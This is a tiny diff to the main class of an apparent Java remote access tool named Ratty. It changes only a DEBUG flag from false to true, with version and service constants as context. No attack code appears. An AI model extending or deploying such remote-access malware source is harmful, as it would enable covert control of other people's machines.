@@ -25,7 +25,7 @@ import de.sogomn.rat.util.XorCipher;
  */
 public final class Ratty {
 	
-	public static final boolean DEBUG = false;
+	public static final boolean DEBUG = true;
 	public static final String VERSION = "1.22.0";
 	public static final ResourceBundle LANGUAGE = ResourceBundle.getBundle("language.lang");
 	public static final IOperatingSystemService OS_SERVICE = IOperatingSystemService.getInstance();
